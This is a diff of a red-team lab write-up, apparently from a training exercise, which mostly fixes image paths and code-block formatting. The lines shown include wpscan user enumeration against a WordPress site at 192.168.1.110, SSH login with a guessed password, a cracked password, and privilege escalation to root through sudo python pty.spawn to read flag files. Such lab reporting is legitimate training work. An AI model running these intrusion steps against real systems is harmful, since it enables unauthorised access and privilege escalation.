@@ -92,7 +92,7 @@ PORT    STATE SERVICE     VERSION\
 - Wordpress Pingback Locator - CVE-2013-0235
 - Wordpress XML-RPC Pingback API
 
-![WordPress Exploit Scan](Images/3-02Wpscan exploits.png)
+![WordPress Exploit Scan](Images/3-02Wpscanexploits.png)
 
 
 
@@ -107,7 +107,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
           The accounts were michael and steven
           The password for michael was easily guessed as : michael, revealing no password
           requirements were being enforced.  wpscan was also able to crack steven's password.
-      - wpscan --url 192.168.1.110/wordpress/ -e
+        
+        wpscan --url 192.168.1.110/wordpress/ -e
         ssh michael@192.168.1.110
         password:michael
         cd /var/www/html
@@ -150,13 +151,13 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       allowing full access to all directories.  A find was performed, revealing a final flag file 
       in /root/flag4.txt
 
-'''
+
       su steven
       pink84
       sudo python -c 'import pty;pty.spawn("/bin/bash")'
       find / -iname flag*
       cd /root/
       cat flag4.txt
-'''
 
-      ![Flag 4](Images/9flag4)
+
+![Flag 4](Images/9flag4)
